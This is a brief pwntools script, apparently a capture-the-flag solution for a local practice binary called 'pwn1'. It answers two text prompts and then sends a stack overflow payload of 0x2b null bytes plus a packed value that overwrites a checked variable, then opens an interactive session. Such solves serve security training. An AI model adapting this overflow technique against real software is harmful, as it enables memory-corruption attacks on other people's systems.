from pwn import *


target = process('./pwn1')


target.sendline('Sir Lancelot of Camelot')
target.sendline('To seek the Holy Grail')

payload = b'\x00'*0x2b + p32(0x0106fd)


target.sendline(payload)

target.interactive()



